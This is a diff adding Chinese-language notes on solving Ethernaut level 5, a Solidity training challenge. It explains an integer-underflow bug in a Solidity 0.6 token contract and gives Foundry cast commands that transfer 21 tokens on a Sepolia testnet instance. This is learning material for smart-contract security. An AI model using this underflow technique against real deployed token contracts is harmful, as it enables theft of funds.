@@ -36,3 +36,35 @@ Ethernaut的第4关要求获得合约的owner权限。
 - attacker 合约：https://sepolia.etherscan.io/address/0xa380337b31833736daa3a044a41e5fb821d15128
 - 可以使用 `cast call` 命令来调用目标合约的 `owner` 函数来获取 `owner` 地址。：
 `cast call 0x231014b0FEf1C0AF96189700a43221fACF1DfF7E "owner()(address)" --rpc-url sepolia`
+
+
+## level 5
+The Ethernaut level 5
+
+第 5 关要求获得更多的token。
+
+合约看起来没什么问题，但是 solidity 版本用的是是 0.6，没有处理整型的下溢/溢出。
+
+因此，只需要发送大于 20 的值，比如 21，就可以获得 21 个token
+
+直接使用 Foundry 的命令: 
+
+查询余额：
+
+```
+cast call <level address> \
+"balanceOf(address)(uint256)" <receiver> \
+--rpc-url sepolia
+```
+
+转账（获取更多token）
+```
+cast send <level address> \
+"transfer(address,uint256)(bool)" <receiver> 21 \
+--rpc-url sepolia \
+--private-key <deployer private key> 
+```
+
+链上记录：
+- level(`Token`) 新实例：[0xC8622C44a00a6d01a0c63390eD54E111ef56282f](https://sepolia.etherscan.io/address/0xC8622C44a00a6d01a0c63390eD54E111ef56282f)
+- receiver: 0x5859FdBE15be13b4413F0E5F96Ce27364F6E21C8
